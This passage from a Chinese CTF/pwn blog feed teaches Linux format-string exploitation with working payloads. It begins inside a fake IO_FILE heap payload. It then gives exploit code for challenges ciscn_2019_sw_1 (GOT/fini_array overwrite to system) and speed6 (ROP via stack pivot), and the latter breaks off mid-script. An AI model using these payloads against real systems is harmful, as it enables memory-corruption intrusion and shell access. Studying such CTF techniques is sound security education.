class="number">1</span>&lt;&lt;<span class="number">64</span>)-<span class="number">1</span>)</span><br><span class="line">fake_io_file += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">fake_io_file += p64(heap_addr+<span class="number">0x2000</span>) <span class="comment">#可写</span></span><br><span class="line">fake_io_file += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">fake_io_file += p64(IO_wide_data_addr)</span><br><span class="line">fake_io_file = fake_io_file.ljust(<span class="number">0xc8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_io_file += p64(IO_help_jump_0_addr)</span><br><span class="line">fake_io_file += p64(<span class="number">0</span>)</span><br><span class="line">fake_io_file += p64(heap_addr+<span class="number">0x2000</span>) <span class="comment">#可写</span></span><br><span class="line">fake_io_file += p64(<span class="number">0</span>)</span><br><span class="line">fake_io_file += p64(target_value_addr)</span><br><span class="line">fake_io_file += p64(target_value_addr + more_len)</span><br><span class="line">fake_io_file += p64(IO_str_jumps_addr)</span><br><span class="line">fake_io_file = fake_io_file.ljust(<span class="number">0x1b8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_io_file += p64(put_stream_addr)</span><br><span class="line">fake_io_file = fake_io_file.ljust(target_value_offset - <span class="number">0x10</span>,<span class="string">b&quot;\x00&quot;</span>)  <span class="comment"># largbin_attak 时需要 - 0x10</span></span><br><span class="line"> </span><br><span class="line">fake_io_file += p64(system_addr) + p64(<span class="number">0</span>)   <span class="comment"># 此段长度为 0x10 与 rdi_offset 对应</span></span><br><span class="line"> </span><br><span class="line">payload = fake_io_file + <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br></pre></td></tr></table></figure></div>
]]></content>
  </entry>
  <entry>
    <title>linux 格式化字符串利用</title>
    <url>/2024/11/08/linux-format-string-exploit/</url>
    <content><![CDATA[<h1 id="基础知识">基础知识</h1>
<h2 id="常见格式化字符串函数">常见格式化字符串函数</h2>
<table>
<thead>
<tr class="header">
<th style="text-align: left;">函数</th>
<th style="text-align: left;">基本介绍</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;">printf</td>
<td style="text-align: left;">输出到stdout</td>
</tr>
<tr class="even">
<td style="text-align: left;">fprintf</td>
<td style="text-align: left;">输出到指定FILE流</td>
</tr>
<tr class="odd">
<td style="text-align: left;">vprintf</td>
<td style="text-align: left;">根据参数列表格式化输出到stdout</td>
</tr>
<tr class="even">
<td style="text-align: left;">vfprintf</td>
<td style="text-align: left;">根据参数列表格式化输出到FILE流</td>
</tr>
<tr class="odd">
<td style="text-align: left;">sprintf</td>
<td style="text-align: left;">输出到字符串</td>
</tr>
<tr class="even">
<td style="text-align: left;">snprintf</td>
<td style="text-align: left;">输出指定字节数到字符串</td>
</tr>
<tr class="odd">
<td style="text-align: left;">vsprintf</td>
<td style="text-align: left;">根据参数列表格式化输出到字符串</td>
</tr>
<tr class="even">
<td style="text-align: left;">vsnprintf</td>
<td
style="text-align: left;">根据参数列表格式化输出指定字节到字符串</td>
</tr>
</tbody>
</table>
<h2 id="常用格式化字符串形式">常用格式化字符串形式</h2>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">%[parameter][flags][field width][.precision][length]type</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>parameter</code>：<code>n$</code> ，获取格式化字符串中的指定第
n 个参数</li>
<li><code>flags</code>：在 <code>width</code>
设置后指定可以用来作为填充的内容之类的内容</li>
<li><code>field width</code>：输出的最小宽度</li>
<li><code>precision</code>：输出的最大长度</li>
<li><code>length</code>：输出的长度
<ul>
<li><code>hh</code>：输出一个字节</li>
<li><code>h</code>：输出一个双字节</li>
</ul></li>
<li><code>type</code>：
<ul>
<li><code>d/i</code>：有符号整数</li>
<li><code>u</code>：无符号整数</li>
<li><code>x</code>/<code>X</code>：16 进制</li>
<li><code>o</code>：8 进制</li>
<li><code>s</code>：字符串指针指向的字符串</li>
<li><code>c</code>：<code>char</code> 类型单个字符</li>
<li><code>p</code>：<code>void *</code> 型，输出对应变量的值。例如
<code>printf("%p",a)</code> 用地址的格式打印变量 <code>a</code>
的值，<code>printf("%p", &amp;a)</code> 打印变量 a 所在的地址。</li>
<li><code>n</code>：不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。
<ul>
<li><code>hhn</code>：写 1 字节</li>
<li><code>hn</code>：写 2 字节</li>
<li><code>n</code>：写 4 字节</li>
<li><code>ln</code>：32 位写 4 字节，64 位写 8 字节</li>
<li><code>lln</code>：写 8 字节</li>
</ul></li>
</ul></li>
</ul>
<h1 id="原理验证">原理验证</h1>
<p>示例程序：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> s[<span class="number">100</span>] = <span class="string">&quot;aaaa.%p.%p.%p.%p.%p.%p.%p&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(s);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="位">32位</h2>
<p>编译命令：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">gcc test.c -g -m32 -o test</span><br></pre></td></tr></table></figure></div>
<p>输出结果：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">aaaa.0x20.(nil).0x565561c5.(nil).(nil).0x61616161.0x2e70252e</span><br></pre></td></tr></table></figure></div>
<p>栈结构：</p>
<pre>00:0000│ <b>esp</b> <font color="#A2734C">0xffffd030</font> —▸ <font color="#A2734C">0xffffd048</font> ◂— &apos;aaaa.%p.%p.%p.%p.%p.%p.%p&apos;
01:0004│-094 <font color="#A2734C">0xffffd034</font> ◂— 0x20 /* &apos; &apos; */
02:0008│-090 <font color="#A2734C">0xffffd038</font> ◂— 0
03:000c│-08c <font color="#A2734C">0xffffd03c</font> —▸ <font color="#C01C28">0x565561c5 (main+24)</font> ◂— <font color="#AFD700">add</font><font color="#FFFFFF"> </font><font color="#5FD7FF">ebx</font><font color="#FFFFFF">, </font><font color="#AF87FF">0x2e0f</font>
04:0010│-088 <font color="#A2734C">0xffffd040</font> ◂— 0
05:0014│-084 <font color="#A2734C">0xffffd044</font> ◂— 0
06:0018│ <b>eax</b> <font color="#A2734C">0xffffd048</font> ◂— &apos;aaaa.%p.%p.%p.%p.%p.%p.%p&apos;
07:001c│-07c <font color="#A2734C">0xffffd04c</font> ◂— &apos;.%p.%p.%p.%p.%p.%p.%p&apos;
</pre>
<p>自上而下依次是参数 0~6，参数 0 为格式化字符串地址，而格式化字符串前 4
字节又作为参数
6（由于栈结构不同，需要视情况而定）。因此如果将格式化字符串合适的位置设置为目标地址就可以对该地址的数据进行操作。</p>
<h2 id="位-1">64位</h2>
<p>编译命令：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">gcc test.c -g -m64 -o test</span><br></pre></td></tr></table></figure></div>
<p>输出结果：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">aaaa.0x7fffffffdfe8.0x70.0x555555557db8.0x7ffff7e1bf10.0x7ffff7fc9040.0x2e70252e61616161.0x70252e70252e7025</span><br></pre></td></tr></table></figure></div>
<p>寄存器：</p>
<pre><font color="#C01C28">*</font><font color="#C01C28"><b>RAX </b></font> 0x6b
 <b>RBX </b> 0
<font color="#C01C28">*</font><font color="#C01C28"><b>RCX </b></font> 1
<font color="#C01C28">*</font><font color="#C01C28"><b>RDX </b></font> 0
<font color="#C01C28">*</font><font color="#C01C28"><b>RDI </b></font> <font color="#A2734C">0x7fffffffd900</font> —▸ <font color="#C01C28">0x7ffff7c62050 (funlockfile)</font> ◂— <font color="#AFD700">endbr64</font><font color="#FFFFFF"> </font>
<font color="#C01C28">*</font><font color="#C01C28"><b>RSI </b></font> <font color="#A2734C">0x7fffffffde79</font> ◂— 0
<font color="#C01C28">*</font><font color="#C01C28"><b>R8  </b></font> 0
<font color="#C01C28">*</font><font color="#C01C28"><b>R9  </b></font> <font color="#A2734C">0x7fffffffdd28</font> ◂— &apos;70252e70252e7025&apos;
<font color="#C01C28">*</font><font color="#C01C28"><b>R10 </b></font> 0
<font color="#C01C28">*</font><font color="#C01C28"><b>R11 </b></font> 0x70252e70252e7025 (&apos;%p.%p.%p&apos;)
 <b>R12 </b> <font color="#A2734C">0x7fffffffdfe8</font> —▸ <font color="#A2734C">0x7fffffffe368</font> ◂— &apos;/home/sky123/Desktop/t&apos;
 <b>R13 </b> <font color="#C01C28">0x555555555169 (main)</font> ◂— <font color="#AFD700">endbr64</font><font color="#FFFFFF"> </font>
 <b>R14 </b> 0x555555557db8 (__do_global_dtors_aux_fini_array_entry) —▸ <font color="#C01C28">0x555555555120 (__do_global_dtors_aux)</font> ◂— <font color="#AFD700">endbr64</font><font color="#FFFFFF"> </font>
 <b>R15 </b> <font color="#A347BA">0x7ffff7ffd040 (_rtld_global)</font> —▸ <font color="#A347BA">0x7ffff7ffe2e0</font> —▸ 0x555555554000 ◂— 0x10102464c457f
 <b>RBP </b> <font color="#A2734C">0x7fffffffded0</font> ◂— 1
 <b>RSP </b> <font color="#A2734C">0x7fffffffde60</font> ◂— &apos;aaaa.%p.%p.%p.%p.%p.%p.%p&apos;
<font color="#C01C28">*</font><font color="#C01C28"><b>RIP </b></font> <font color="#C01C28">0x55555555520f (main+166)</font> ◂— <font color="#AFD700">mov</font><font color="#FFFFFF"> </font><font color="#5FD7FF">eax</font><font color="#FFFFFF">, </font><font color="#AF87FF">0</font>
</pre>
<p>栈结构：</p>
<pre>00:0000│ <b>rsp  </b> <font color="#A2734C">0x7fffffffde60</font> ◂— &apos;aaaa.%p.%p.%p.%p.%p.%p.%p&apos;
01:0008│-068   <font color="#A2734C">0x7fffffffde68</font> ◂— &apos;%p.%p.%p.%p.%p.%p&apos;
02:0010│-060   <font color="#A2734C">0x7fffffffde70</font> ◂— &apos;.%p.%p.%p&apos;
03:0018│ <b>rsi-1</b> <font color="#A2734C">0x7fffffffde78</font> ◂— 0x70 /* &apos;p&apos; */
04:0020│-050   <font color="#A2734C">0x7fffffffde80</font> ◂— 0
... ↓          3 skipped
</pre>
<p>由于 64 位程序先使用
<code>rdi</code>、<code>rsi</code>、<code>rdx</code>、<code>rcx</code>、<code>r8</code>、<code>r9</code>
寄存器作为函数参数的前六个参数，多余的参数会依次压在栈上，因此前6个输出的为寄存器中的值（<code>aaaa</code>
看做是格式化字符串参数），格式化字符串前 8 个字节作为参数 6。</p>
<h1 id="泄露内存">泄露内存</h1>
<h2 id="泄露栈变量内存">泄露栈变量内存</h2>
<h3 id="泄露栈变量的值">泄露栈变量的值</h3>
<p>获取栈中被视为第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">n+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>
个参数的值：<code>%n$x</code>（<code>%n$p</code>）</p>
<p><strong>注意：<code>%x</code> 其实只是 <code>%d</code> 的 16
进制输出，对应的是 32 位也就是 4 字节；在 64 位操作系统下，只会截取后 32
位；<code>%p</code> 和系统位数关联没有问题，因此建议用 <code>%p</code>
。</strong> ### 泄露栈变量对应对应地址的内容</p>
<p>获取栈中被视为第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">n+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>
个参数对应地址的内容：<code>%n$s</code></p>
<h2 id="泄露任意地址内存">泄露任意地址内存</h2>
<p>获取地址addr对应的值（addr为第k个参数）：<code>addr%k$s</code></p>
<h1 id="覆盖内存">覆盖内存</h1>
<p>覆盖内存的原理是 <code>%k$n</code> 可以覆盖第 k
个参数指向的地址为已经输出的字符数量。</p>
<p><strong>注意：覆盖内存只能覆盖栈上某地址指向的内存，而不是直接覆盖栈上某地址。</strong>
## pwntools生成payload</p>
<p>对于格式化字符串payload，pwntools也提供了一个可以直接使用的类Fmtstr，具体文档见http://docs.pwntools.com/en/stable/fmtstr.html，我们较常使用的功能是</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">fmtstr_payload(offset, &#123;address:data&#125;, numbwritten=<span class="number">0</span>, write_size=<span class="string">&#x27;byte&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>offset</code>：表示格式化字符串的偏移</li>
<li><code>numbwritten</code>：表示已经输出的字符个数</li>
<li><code>write_size</code>：表示写入方式，是按字节（byte）、按双字节（short）还是按四字节（int），对应着
<code>hhn</code>、<code>hn</code> 和 <code>n</code>，默认值是 byte，即按
<code>hhn</code> 写。</li>
</ul>

  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content">
      <p>部分题目会限制时间，导致pwntools生成的payload失效。一般这一类题目可以通过仅修改低地址等操作减小输出长度，这时需要手动构造payload。</p>

    </div>
  </div>
<h2 id="手动构造payload">手动构造payload</h2>
<h3 id="覆盖小数字">覆盖小数字</h3>
<p>对于小于机器字长的数字，如果把地址放在格式化字符串前面会使得已输出字符个数大于数字大小，因此要将地址放在后面。</p>
<p>以数字2为例：<code>aa%k$n[padding][addr]</code></p>
<h3 id="覆盖大数字">覆盖大数字</h3>
<p>直接一次性输出大数字个字节来进行覆盖时间过长，因此需要把大数字拆分成若干个部分，分别进行覆盖。比如<code>hhn</code>按字节写或<code>hn</code>按双字写。</p>
<p>以<code>hhn</code>写入32bit数为例，payload形式为：<code>[addr][addr+1][addr+2][addr+3][pad1]%k$hhn[pad2]%(k+1)$hhn[pad3]%(k+2)$hhn[pad4]%(k+3)$hhn</code></p>
<h4 id="例题ciscn_2019_sw_1">例题：ciscn_2019_sw_1</h4>
<p><a class="link" 
 href="https://gitcode.net/qq_45323960/buuoj/-/tree/master/ciscn_2019_sw_1" >附件下载链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>保护情况：</p>
<pre>    Arch:     i386-32-little
    RELRO:    <font color="#C01C28">No RELRO</font>
    Stack:    <font color="#C01C28">No canary found</font>
    NX:       <font color="#26A269">NX enabled</font>
    PIE:      <font color="#C01C28">No PIE (0x8048000)</font>
</pre>
<p>主程序典型的格式化字符串漏洞。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> format[<span class="number">68</span>]; <span class="comment">// [esp+0h] [ebp-48h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to my ctf! What&#x27;s your name?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%64s&quot;</span>, format);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(format);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/e292e1e5e50f6bb76433f2c2e0dfba34.png"
                     
alt="在这里插入图片描述" 
                > <code>init_array</code> 和
<code>fini_array</code>
中存放的函数指针分别在加载和结束时依次调用，且仅在 <code>RELRO</code> 为
<code>NO RELRO</code> 时可以修改。为了多次利用格式化字符串漏洞，需要将
<code>fini_array</code> 修改为 <code>main</code> 函数地址。 第一次执行
<code>main</code> 函数将 <code>fini_array</code> 修改为
<code>main</code> 函数地址，且将 <code>printf@got</code> 修改为
<code>system@plt</code> 。 | 名称 | 地址 | | ------------ | ---------- |
| <code>fini_array</code> | 0x0804979C | | <code>main</code> |
0x08048534 | | <code>printf@got</code> | 0x0804989C | |
<code>system@plt</code> | 0x080483D0 |</p>
<p><code>payload</code> 为： <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">payload = <span class="built_in">p32</span>(fini_array<span class="number">+2</span>) + <span class="built_in">p32</span>(printf_got<span class="number">+2</span>) </span><br><span class="line">payload += <span class="built_in">p32</span>(printf_got) + <span class="built_in">p32</span>(fini_array)</span><br><span class="line">payload += <span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>(<span class="number">0x0804</span><span class="number">-0x10</span>)+<span class="string">&quot;c&quot;</span> + <span class="string">&quot;%4$hn&quot;</span></span><br><span class="line">payload += <span class="string">&quot;%5$hn&quot;</span></span><br><span class="line">payload += <span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>(<span class="number">0x83D0</span><span class="number">-0x0804</span>)+<span class="string">&quot;c&quot;</span> + <span class="string">&quot;%6$hn&quot;</span></span><br><span class="line">payload += <span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>(<span class="number">0x8534</span><span class="number">-0x83D0</span>)+<span class="string">&quot;c&quot;</span> + <span class="string">&quot;%7$hn&quot;</span></span><br></pre></td></tr></table></figure></div> 第二次执行 <code>main</code>
函数 发送 <code>\bin\sh</code> 获取 <code>shell</code> 。 ##
堆上格式化字符串通用解法 ### 例题：2022 Midnight Sun CTF speed6 <a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/2022MidnightSunCTF_speed6" >附件下载链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>存在一个堆上格式化字符串。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> canary; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  canary = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  buf = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x100</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;f5b: &quot;</span>);</span><br><span class="line">  fgets(buf, <span class="number">0x100</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">free</span>(buf);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ canary;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> <code>main</code>
函数循环调用 <code>call_vuln</code> 函数，而 <code>call_vuln</code>
函数经过多层函数调用最终调用到 <code>vuln</code> 函数。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  banner();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    call_vuln();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
首先通过格式化字符串漏洞我们可以泄露栈地址和 libc 基址。</p>
<p>之后考虑构造任意地址写原语。由于格式化字符串在堆上，我们不能直接在栈上布置要写入的地址，因此需要借助栈上的
ebp 链进行构造。</p>
<p>我们发现只要栈上存在一个有 <strong>2 跳</strong>的
ebp链就可以构<strong>造栈上相对地址写原语</strong>： <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/0687bb65b40467b6627c8c2f18f10f6e.png"
                     
alt="在这里插入图片描述" 
                ></p>
<p>由于我们有了<strong>栈上相对地址写原语</strong>，因此可以进一步构造<strong>任意地址写原语</strong>：
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/3d51466d90ad3db8c92f52a22ce01fca.png"
                     
alt="在这里插入图片描述" 
                >
有了任意地址读写后就考虑如何劫持程序执行流程。</p>
<p>由于格式化字符串函数在一个死循环里面且格式化字符串漏洞无法再一次循环中写入完整地址，因此不能通过直接栈上写
ROP 的方式劫持程序执行流程。</p>
<p>但是由于本题的 RELRO 保护为 Partial RELRO ，可以改 got 表，并且开启
canary 保护，因此我们可以考虑修改 <code>__stack_chk_fail@got</code>
，然后再修改 canary 调用 <code>__stack_chk_fail</code>
函数劫持程序执行流程。</p>
<p>最直接的方法是在 <code>__stack_chk_fail@got</code> 上写 one_gadget
。不过这里有一个更通用的方法，那就是通过栈迁移到栈上的 ROP 完成 get
shell 。</p>
<p>我们利用 IDAPython 脚本在 libc 中搜索合适的栈迁移 gadget 。
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">from</span> idaapi <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"></span><br><span class="line">start_ea = <span class="literal">None</span></span><br><span class="line">end_ea = <span class="literal">None</span></span><br><span class="line">max_len = <span class="number">10</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Gadget</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, addr, asms, val</span>):</span><br><span class="line">        <span class="variable language_">self</span>.addr = addr</span><br><span class="line">        <span class="variable language_">self</span>.asms = asms</span><br><span class="line">        <span class="variable language_">self</span>.val = val</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> seg <span class="keyword">in</span> idautils.Segments():</span><br><span class="line">        <span class="keyword">if</span> idc.get_segm_name(seg) == <span class="string">&#x27;.text&#x27;</span>:</span><br><span class="line">            start_ea = idc.get_segm_start(seg)</span><br><span class="line">            end_ea = idc.get_segm_end(seg)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">assert</span> start_ea != <span class="literal">None</span></span><br><span class="line">    fp = <span class="built_in">open</span>(<span class="string">&quot;rop.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">    gadgets = []</span><br><span class="line">    i = start_ea</span><br><span class="line">    <span class="keyword">while</span> i &lt; end_ea:</span><br><span class="line">        asm = idc.generate_disasm_line(i, <span class="number">0</span>).split(<span class="string">&quot;;&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> asm.startswith(<span class="string">&quot;add     esp, &quot;</span>):</span><br><span class="line">            asms = [asm.replace(<span class="string">&quot;     &quot;</span>, <span class="string">&quot; &quot;</span>)]</span><br><span class="line">            val = idc.get_operand_value(i, <span class="number">1</span>)</span><br><span class="line">            j = i + get_item_size(i)</span><br><span class="line">            <span class="keyword">while</span> j &lt; end_ea:</span><br><span class="line">                asm = idc.generate_disasm_line(j, <span class="number">0</span>).split(<span class="string">&quot;;&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">                asms.append(asm.replace(<span class="string">&quot;     &quot;</span>, <span class="string">&quot; &quot;</span>))</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(asms) &gt; max_len: <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;rsp&quot;</span> <span class="keyword">in</span> asm <span class="keyword">or</span> <span class="string">&quot;esp&quot;</span> <span class="keyword">in</span> asm <span class="keyword">or</span> <span class="string">&quot;leave&quot;</span> <span class="keyword">in</span> asm <span class="keyword">or</span> <span class="string">&quot;call&quot;</span> <span class="keyword">in</span> asm: <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> print_insn_mnem(j) == <span class="string">&quot;push&quot;</span>: val -= <span class="number">4</span></span><br><span class="line">                <span class="keyword">if</span> print_insn_mnem(j) == <span class="string">&quot;pop&quot;</span>: val += <span class="number">4</span></span><br><span class="line">                <span class="keyword">if</span> print_insn_mnem(j) == <span class="string">&quot;retn&quot;</span>:</span><br><span class="line">                    gadgets.append(Gadget(i, asms, val))</span><br><span class="line">                    gadget = Gadget(i, asms, val)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;val: &quot;</span> + <span class="built_in">hex</span>(gadget.val))</span><br><span class="line">                    <span class="built_in">print</span>(<span class="built_in">hex</span>(gadget.addr) + <span class="string">&quot; : &quot;</span> + <span class="string">&quot;; &quot;</span>.join(gadget.asms) + <span class="string">&quot;;&quot;</span>)</span><br><span class="line">                    j += get_item_size(j)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                j += get_item_size(j)</span><br><span class="line">            i = j</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            i += get_item_size(i)</span><br><span class="line">    gadgets = <span class="built_in">sorted</span>(gadgets, key=<span class="keyword">lambda</span> gadget: gadget.val)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;_________________________________________&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(gadgets))</span><br><span class="line">    <span class="keyword">for</span> gadget <span class="keyword">in</span> gadgets:</span><br><span class="line">        fp.write(<span class="string">&quot;val: &quot;</span> + <span class="built_in">hex</span>(gadget.val) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        fp.write(<span class="built_in">hex</span>(gadget.addr) + <span class="string">&quot; : &quot;</span> + <span class="string">&quot;; &quot;</span>.join(gadget.asms) + <span class="string">&quot;;\n&quot;</span>)</span><br><span class="line">    fp.close()</span><br></pre></td></tr></table></figure></div> 最终找到了一个可以将 esp 加 0x100 的 gadget 。
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0xa08c9 : add esp, 100h; sub eax, edx; retn;</span><br></pre></td></tr></table></figure></div> 我们只需要再栈迁移的目标地址上利用栈上相对地址写原语写入
ROP 即可。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./speed6_patch&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">context(arch=elf.arch, os=elf.os)</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = process([elf.path])</span><br><span class="line"></span><br><span class="line">n16 = <span class="keyword">lambda</span> x: (x + <span class="number">0x10000</span>) &amp; <span class="number">0xFFFF</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;f5b: &quot;</span>, <span class="string">&quot;%2$p||%37$p&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>(p.recvuntil(<span class="string">&quot;||&quot;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>) - libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc base: &quot;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line">stack_addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">&quot;\n&quot;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>) - <span class="number">0x55</span> * <span class="number">4</span></span><br><span class="line">log.success(<span class="string">&quot;stack: &quot;</span> + <span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arbitrary_offset_write</span>(<span class="params">offset, value</span>):</span><br><span class="line">    <span class="keyword">assert</span> (stack_addr &amp; <span class="number">0xFFFF</span>) + offset &lt; (<span class="number">1</span> &lt;&lt; <span class="number">16</span>) <span 